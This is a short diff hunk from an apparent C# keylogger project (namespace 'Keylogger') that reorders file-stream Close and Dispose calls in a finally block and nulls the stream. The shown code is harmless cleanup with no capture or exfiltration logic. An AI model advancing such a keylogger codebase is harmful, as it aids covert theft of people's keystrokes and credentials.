@@ -421,8 +421,9 @@ namespace Keylogger
 
             finally
             {
-                fs.Dispose();
-                fs.Close();
+                fs?.Close();
+                fs?.Dispose();
+                fs = null;
             }
         }
 
